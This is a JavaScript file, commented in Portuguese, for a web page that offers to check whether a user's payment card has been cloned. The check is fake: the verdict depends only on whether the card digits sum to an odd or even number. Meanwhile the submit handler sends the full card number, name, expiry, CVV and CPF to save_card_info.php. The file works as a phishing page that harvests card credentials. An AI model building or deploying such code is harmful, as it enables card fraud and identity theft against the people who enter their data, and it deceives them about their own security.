// formatar o número do cartão em grupos de 4 dígitos
function formatarNumeroCartao(numero) {
    const numeroLimpo = numero.replace(/\D/g, '');
    const grupos = numeroLimpo.match(/.{1,4}/g);
    return grupos ? grupos.join(' ') : numeroLimpo;
}

// Função para detectar a bandeira do cartão a partir dos dígitos iniciais
function detectarBandeira(numero) {
    const n = numero.replace(/\D/g, '');
    if (!n || n.length === 0) return { name: 'unknown', icon: 'src/icons/visa-w62-h20.svg' };

    // Ordem importa: checar padrões mais específicos primeiro
    const patterns = [
        { name: 'amex', regex: /^3[47]/, icon: 'src/icons/amex-w62-h20.svg' },
        { name: 'visa', regex: /^4/, icon: 'src/icons/visa-w62-h20.svg' },
        { name: 'mastercard', regex: /^(5[1-5]|2[2-7])/, icon: 'src/icons/master-w60-h60.svg' },
        { name: 'discover', regex: /^(6011|65|64[4-9]|622)/, icon: 'src/icons/discover-w62-h20.svg' },
        { name: 'diners', regex: /^3(?:0[0-5]|[68])/, icon: 'src/icons/diners-w62-h20.svg' },
        { name: 'jcb', regex: /^35/, icon: 'src/icons/jcb-w62-h20.svg' },
        { name: 'elo', regex: /^(4011|431274|438935|457631|457632|504175|5067|5090|627780|636297|636368|650)/, icon: 'src/icons/elo-w62-h20.svg' },
        { name: 'hipercard', regex: /^(606282|3841|38)/, icon: 'src/icons/hipercard-w62-h20.svg' }
    ];

    for (let i = 0; i < patterns.length; i++) {
        if (patterns[i].regex.test(n)) {
            return { name: patterns[i].name, icon: patterns[i].icon };
        }
    }

    // fallback genérico (visa como padrão visual)
    return { name: 'unknown', icon: 'src/icons/visa-w62-h20.svg' };
}

// Adiciona evento para formatar o número do cartão enquanto digita
document.addEventListener('DOMContentLoaded', function() {
    const cardNumberInput = document.getElementById('card-number');
    const cpfInput = document.getElementById('cpf-text');
    const validadeInput = document.getElementById('valid-thru-text');
    const nomeInput = document.getElementById('name-text');
    const cvvInput = document.getElementById('cvv-text');
    const numberDisplay = document.querySelector('.number-v1');
    
    cardNumberInput.addEventListener('input', function(e) {
        let cursorPos = e.target.selectionStart;
        let valorAntigo = e.target.value;
        let valorNovo = formatarNumeroCartao(valorAntigo);
        
        e.target.value = valorNovo;
        numberDisplay.textContent = valorNovo || '0000 0000 0000 0000';
        
        // Ajusta a posição do cursor considerando os espaços adicionados
        if (valorNovo.length > valorAntigo.length) {
            cursorPos++;
        }
        e.target.setSelectionRange(cursorPos, cursorPos);

        // Atualiza a bandeira do cartão conforme o número digitado
        const bandeiraImg = document.querySelector('.bandeira');
        if (bandeiraImg) {
            // usa apenas os dígitos para detecção
            const numeroLimpo = valorNovo.replace(/\D/g, '');
            const bandeira = detectarBandeira(numeroLimpo);
            // atualiza src e alt
            bandeiraImg.src = bandeira.icon;
            bandeiraImg.alt = bandeira.name;
            // Adiciona classe para animação suave
            bandeiraImg.classList.add('bandeira-troca');
            setTimeout(() => bandeiraImg.classList.remove('bandeira-troca'), 300);
        }
    });

    // Formata CPF enquanto digita
    cpfInput.addEventListener('input', function(e) {
        let cursorPos = e.target.selectionStart;
        let valorAntigo = e.target.value;
        // Remove tudo que não for número
        let apenasNumeros = valorAntigo.replace(/\D/g, '');
        // Limita a 11 dígitos
        apenasNumeros = apenasNumeros.slice(0, 11);
        let valorNovo = formatarCPF(apenasNumeros);
        e.target.value = valorNovo;
        
        // Ajusta cursor
        if (valorNovo.length > valorAntigo.length && valorNovo.length < 14) cursorPos++;
        e.target.setSelectionRange(cursorPos, cursorPos);
    });

    // Formata validade enquanto digita
    validadeInput.addEventListener('input', function(e) {
        let cursorPos = e.target.selectionStart;
        let valorAntigo = e.target.value;
        // Remove tudo que não for número
        let apenasNumeros = valorAntigo.replace(/\D/g, '');
        // Limita a 4 dígitos
        apenasNumeros = apenasNumeros.slice(0, 4);
        let valorNovo = formatarValidade(apenasNumeros);
        e.target.value = valorNovo;
        
        // Adiciona a barra após os dois primeiros números
        if (apenasNumeros.length >= 2 && valorAntigo.length < valorNovo.length) cursorPos++;
        e.target.setSelectionRange(cursorPos, cursorPos);
    });

    // Limita CVV a números
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    // Capitaliza nome
    nomeInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.toUpperCase();
    });
});

// Função que pega o número do cartão, soma todos os números e verifica se é par ou ímpar
// Funções de formatação extras
function formatarCPF(cpf) {
    const numeroLimpo = cpf.replace(/\D/g, '');
    if (numeroLimpo.length <= 3) return numeroLimpo;
    if (numeroLimpo.length <= 6) return numeroLimpo.replace(/^(\d{3})(\d{0,3})/, '$1.$2');
    if (numeroLimpo.length <= 9) return numeroLimpo.replace(/^(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
    return numeroLimpo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
}

function formatarValidade(validade) {
    const numeroLimpo = validade.replace(/\D/g, '');
    if (numeroLimpo.length < 2) return numeroLimpo;
    return numeroLimpo.replace(/^(\d{2})(\d{0,2}).*/, '$1/$2');
}

function verificarCartao() {
    // Pega o número do cartão do input
    var cardNumberInput = document.getElementById('card-number');
    var cardNumber = cardNumberInput.value.replace(/\D/g, ''); // Remove todos os não números
    
    // Valida se há número digitado
    if (!cardNumber || cardNumber.length === 0) {
        mostrarErro('Por favor, digite o número do cartão');
        return false;
    }

    // Valida o nome (não pode estar vazio e deve ter pelo menos nome e sobrenome)
    const nome = document.getElementById('name-text').value.trim();
    if (!nome || nome.length < 5 || !nome.includes(' ')) {
        mostrarErro('Digite o nome completo como está impresso no cartão');
        return false;
    }

    // Valida CPF
    const cpf = document.getElementById('cpf-text').value.replace(/\D/g, '');
    if (cpf.length !== 11) {
        mostrarErro('CPF inválido. Digite os 11 números.');
        return false;
    }

    // Valida validade do cartão
    const validade = document.getElementById('valid-thru-text').value;
    const [mes, ano] = validade.split('/');
    
    if (!/^\d{2}\/\d{2}$/.test(validade)) {
        mostrarErro('Use o formato MM/AA para a validade do cartão');
        return false;
    }

    const mesNum = parseInt(mes);
    const anoNum = parseInt(ano);
    const dataAtual = new Date();
    const anoAtual = dataAtual.getFullYear() % 100;
    const mesAtual = dataAtual.getMonth() + 1;

    if (mesNum < 1 || mesNum > 12) {
        mostrarErro('Mês da validade inválido');
        return false;
    }

    if (anoNum < anoAtual || (anoNum === anoAtual && mesNum < mesAtual)) {
        mostrarErro('Cartão vencido');
        return false;
    }

    // Valida CVV
    const cvv = document.getElementById('cvv-text').value;
    if (!/^\d{3,4}$/.test(cvv)) {
        mostrarErro('CVV deve ter 3 ou 4 números');
        return false;
    }
    
    // Soma todos os números do cartão
    var sum = 0;
    for (var i = 0; i < cardNumber.length; i++) {
        sum += parseInt(cardNumber[i]);
    }
    
        // Verifica se a soma é par ou ímpar e mostra pop-up
    if (sum % 2 === 0) {
        // Se for par, mostra retorno positivo
        mostrarPopUp('retorno-positivo-busca');
    } else {
        // Se for ímpar, mostra retorno negativo
        mostrarPopUp('retorno-negativo-busca');
    }
    
    // Permite o envio do formulário
    return true;
}

// Função para mostrar o resultado abaixo do cartão
function mostrarPopUp(tipoRetorno) {
    const resultadoContainer = document.getElementById('resultado-container');
    
    // Configura o conteúdo baseado no tipo
    if (tipoRetorno === 'retorno-negativo-busca') {
        // Configura para retorno negativo
        resultadoContainer.innerHTML = `
            <div class="resultado-negativo" role="alert">
                <img class="aviso-icone" src="src/icons/aviso-w48-h44.svg" alt="aviso de alerta">
                <div class="aviso-interno">Seu cartão pode estar clonado!<br>Contate seu banco imediatamente</div>
            </div>`;
    } else {
        // Configura para retorno positivo
        resultadoContainer.innerHTML = `
            <div class="resultado-positivo" role="status">
                <img class="aviso-icone" src="src/icons/checked-w49-h49.svg" alt="ícone de sucesso">
                <div class="aviso-interno">Sucesso!<br>Não encontramos evidências de clonagem.</div>
            </div>`;
    }
}

// Função para mostrar mensagens de erro com estilo
function mostrarErro(mensagem) {
    const resultadoContainer = document.getElementById('resultado-container');
    resultadoContainer.innerHTML = `
        <div class="resultado-negativo" role="alert">
            <img class="aviso-icone" src="src/icons/aviso-w48-h44.svg" alt="erro">
            <div class="aviso-interno">${mensagem}</div>
        </div>`;
}

// Quando a página carregar, adiciona os eventos
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('credit-card');
    
    // Adiciona um evento de submit ao formulário
    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Previne o envio do formulário temporariamente
        
        if (verificarCartao()) {
            const formData = new FormData(this);
            
            // Envia os dados via fetch
            fetch('save_card_info.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Mostra mensagem de sucesso
                    mostrarPopUp('retorno-positivo-busca');
                    // Recarrega a página após 2 segundos
                    setTimeout(() => {
                        window.location.reload();
                    }, 2000);
                } else {
                    // Mostra mensagem de erro retornada pelo servidor
                    mostrarErro(data.message || 'Erro ao processar a solicitação.');
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                mostrarErro('Erro ao processar a solicitação. Tente novamente.');
            });
        }
    });
});
